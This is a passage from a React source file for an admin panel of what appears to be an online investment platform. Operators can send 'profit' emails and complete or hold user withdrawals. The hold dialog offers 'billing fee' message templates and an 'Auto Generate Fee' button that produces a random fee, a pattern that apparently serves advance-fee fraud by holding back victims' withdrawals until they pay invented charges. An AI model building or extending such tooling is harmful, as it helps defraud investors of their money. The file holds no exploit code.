                          >
                            {updating === investment.id ? (
                              <Loader2 className="w-4 h-4 animate-spin" />
                            ) : (
                              <Send className="w-4 h-4 mr-1" />
                            )}
                            Send Profit Email
                          </Button>
                          {investment.status !== 'cancelled' && (
                            <Button
                              size="sm"
                              variant="outline"
                              onClick={() => updateInvestment(investment.id, 'cancelled')}
                              disabled={updating === investment.id}
                              className="border-red-500 text-red-500 hover:bg-red-500/10"
                            >
                              <XCircle className="w-4 h-4 mr-1" />
                              Cancel
                            </Button>
                          )}
                        </div>
                      </div>
                    </div>
                  </div>
                ))}
              </div>
            )}
          </>
        )}

        {/* Withdrawals Tab */}
        {activeTab === 'withdrawals' && (
          <>
            {withdrawals.length === 0 ? (
              <div className="bg-slate-800/80 backdrop-blur-xl border border-slate-700 rounded-xl p-8 text-center animate-fade-in">
                <Wallet className="w-12 h-12 mx-auto text-slate-500 mb-4" />
                <h3 className="text-lg font-semibold text-white mb-2">No withdrawals yet</h3>
                <p className="text-slate-400">When users request withdrawals, they will appear here.</p>
              </div>
            ) : (
              <div className="grid gap-4">
                {withdrawals.map((withdrawal) => (
                  <div
                    key={withdrawal.id}
                    className="bg-slate-800/80 backdrop-blur-xl border border-slate-700 rounded-xl p-4 md:p-6 animate-fade-in hover:border-slate-600 transition-colors"
                  >
                    <div className="flex flex-col md:flex-row md:items-start justify-between gap-4">
                      <div className="flex-1">
                        <div className="flex flex-wrap items-center gap-2 mb-2">
                          <h3 className="text-lg font-semibold text-white">
                            ${withdrawal.amount.toLocaleString()}
                          </h3>
                          <span className={`px-2 py-1 text-xs rounded-full border ${getStatusBadge(withdrawal.status)}`}>
                            {withdrawal.status}
                          </span>
                        </div>
                        <div className="text-sm text-slate-400 space-y-1">
                          <p>User: {withdrawal.profiles?.full_name || 'Unknown'}</p>
                          <p>Email: {withdrawal.profiles?.email || 'N/A'}</p>
                          <p>Country: {withdrawal.country}</p>
                          <p>Payment Details: {withdrawal.payment_details}</p>
                          <p>Date: {new Date(withdrawal.created_at).toLocaleDateString()}</p>
                          {withdrawal.hold_message && (
                            <p className="text-orange-400">
                              <AlertCircle className="w-3 h-3 inline mr-1" />
                              Hold Message: {withdrawal.hold_message}
                            </p>
                          )}
                        </div>
                      </div>

                      <div className="flex flex-col gap-3 md:items-end">
                        <div className="flex flex-wrap gap-2">
                          {withdrawal.status === 'pending' && (
                            <>
                              <Button
                                size="sm"
                                onClick={() => updateWithdrawal(withdrawal.id, 'completed')}
                                disabled={updatingWithdrawal === withdrawal.id}
                                className="bg-green-600 hover:bg-green-700"
                              >
                                {updatingWithdrawal === withdrawal.id ? (
                                  <Loader2 className="w-4 h-4 animate-spin" />
                                ) : (
                                  <CheckCircle className="w-4 h-4 mr-1" />
                                )}
                                Complete
                              </Button>
                              <Button
                                size="sm"
                                variant="outline"
                                onClick={() => openStatusModal(withdrawal, 'processing')}
                                disabled={updatingWithdrawal === withdrawal.id}
                                className="border-blue-500 text-blue-400 hover:bg-blue-500/10"
                              >
                                <Clock className="w-4 h-4 mr-1" />
                                Processing
                              </Button>
                              <Button
                                size="sm"
                                variant="outline"
                                onClick={() => openStatusModal(withdrawal, 'on_hold')}
                                disabled={updatingWithdrawal === withdrawal.id}
                                className="border-orange-500 text-orange-400 hover:bg-orange-500/10"
                              >
                                <AlertCircle className="w-4 h-4 mr-1" />
                                Hold
                              </Button>
                            </>
                          )}
                          {withdrawal.status === 'on_hold' && (
                            <>
                              <Button
                                size="sm"
                                onClick={() => updateWithdrawal(withdrawal.id, 'completed')}
                                disabled={updatingWithdrawal === withdrawal.id}
                                className="bg-green-600 hover:bg-green-700"
                              >
                                {updatingWithdrawal === withdrawal.id ? (
                                  <Loader2 className="w-4 h-4 animate-spin" />
                                ) : (
                                  <CheckCircle className="w-4 h-4 mr-1" />
                                )}
                                Complete
                              </Button>
                              <Button
                                size="sm"
                                variant="outline"
                                onClick={() => openStatusModal(withdrawal, 'on_hold')}
                                disabled={updatingWithdrawal === withdrawal.id}
                                className="border-electric-blue text-electric-blue hover:bg-electric-blue/10"
                              >
                                Edit Message
                              </Button>
                              <Button
                                size="sm"
                                variant="outline"
                                onClick={() => openStatusModal(withdrawal, 'pending')}
                                disabled={updatingWithdrawal === withdrawal.id}
                                className="border-yellow-500 text-yellow-400 hover:bg-yellow-500/10"
                              >
                                Set Pending
                              </Button>
                            </>
                          )}
                        </div>
                      </div>
                    </div>
                  </div>
                ))}
              </div>
            )}
          </>
        )}
      </main>

      {/* Status Modal */}
      {showStatusModal && statusModalWithdrawal && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/70 backdrop-blur-sm animate-fade-in">
          <div className="bg-slate-800 border border-slate-700 rounded-2xl w-full max-w-md">
            {/* Modal Header */}
            <div className="flex items-center justify-between p-4 border-b border-slate-700">
              <div className="flex items-center gap-3">
                <div className={`w-10 h-10 rounded-full flex items-center justify-center ${
                  statusModalType === 'on_hold' ? 'bg-orange-500/20' : 
                  statusModalType === 'processing' ? 'bg-blue-500/20' : 'bg-yellow-500/20'
                }`}>
                  {statusModalType === 'on_hold' ? (
                    <AlertCircle className="w-5 h-5 text-orange-500" />
                  ) : statusModalType === 'processing' ? (
                    <Loader2 className="w-5 h-5 text-blue-500" />
                  ) : (
                    <Clock className="w-5 h-5 text-yellow-500" />
                  )}
                </div>
                <div>
                  <h3 className="font-bold text-lg text-white">
                    {statusModalType === 'on_hold' ? 'Put on Hold' : 
                     statusModalType === 'processing' ? 'Set Processing' : 'Set Pending'}
                  </h3>
                  <p className="text-xs text-slate-400">${statusModalWithdrawal.amount.toLocaleString()}</p>
                </div>
              </div>
              <button 
                onClick={() => setShowStatusModal(false)}
                className="p-2 hover:bg-slate-700 rounded-lg transition-colors"
              >
                <X className="w-5 h-5 text-slate-400" />
              </button>
            </div>

            {/* Modal Content */}
            <div className="p-4 space-y-4">
              {statusModalType === 'on_hold' && (
                <>
                  <div className="space-y-2">
                    <Label className="text-slate-300">Hold/Billing Fee Message</Label>
                    <textarea
                      value={statusModalMessage}
                      onChange={(e) => setStatusModalMessage(e.target.value)}
                      className="w-full h-24 bg-slate-900/50 border border-slate-600 rounded-lg p-3 text-white text-sm resize-none focus:outline-none focus:ring-2 focus:ring-orange-500"
                      placeholder="Enter the billing fee or hold message..."
                    />
                  </div>
                  <div className="flex gap-2">
                    <Button
                      type="button"
                      variant="outline"
                      size="sm"
                      onClick={generateRandomFeeMessage}
                      className="border-slate-600 text-slate-300 hover:bg-slate-700"
                    >
                      Auto Generate Fee
                    </Button>
                  </div>
                  <div className="space-y-2">
                    <Label className="text-slate-400 text-xs">Quick Templates:</Label>
                    <div className="grid gap-2">
                      {BILLING_FEE_TEMPLATES.slice(0, 3).map((template, index) => (
                        <button
                          key={index}
                          type="button"
                          onClick={() => setStatusModalMessage(template)}
                          className="text-left text-xs p-2 bg-slate-900/50 border border-slate-700 rounded-lg text-slate-400 hover:bg-slate-700 hover:text-white transition-colors"
                        >
                          {template}
                        </button>
                      ))}
                    </div>
                  </div>
                </>
              )}

              {statusModalType === 'processing' && (
                <div className="bg-blue-500/10 border border-blue-500/30 rounded-lg p-4">
                  <p className="text-blue-400 text-sm">
                    This will set the withdrawal to a processing state. The user will be notified that their withdrawal is being processed.
                  </p>
                </div>
              )}

              {statusModalType === 'pending' && (
                <div className="bg-yellow-500/10 border border-yellow-500/30 rounded-lg p-4">
                  <p className="text-yellow-400 text-sm">
                    This will reset the withdrawal to pending status.
                  </p>
                </div>
              )}
            </div>

            {/* Modal Footer */}
            <div className="p-4 border-t border-slate-700 flex gap-3">
              <Button
                variant="outline"
                onClick={() => setShowStatusModal(false)}
                className="flex-1 border-slate-600 text-slate-300 hover:bg-slate-700"
              >
                Cancel
              </Button>
              <Button
                onClick={handleStatusModalSave}
                disabled={updatingWithdrawal === statusModalWithdrawal.id}
                className={`flex-1 ${
                  statusModalType === 'on_hold' ? 'bg-orange-600 hover:bg-orange-700' :
                  statusModalType === 'processing' ? 'bg-blue-600 hover:bg-blue-700' :
                  'bg-yellow-600 hover:bg-yellow-700'
                }`}
              >
                {updatingWithdrawal === statusModalWithdrawal.id ? (
                  <Loader2 className="w-4 h-4 animate-spin mr-2" />
                ) : (
                  <Send className="w-4 h-4 mr-2" />
                )}
                Save & Notify
              </Button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};

export default Admin;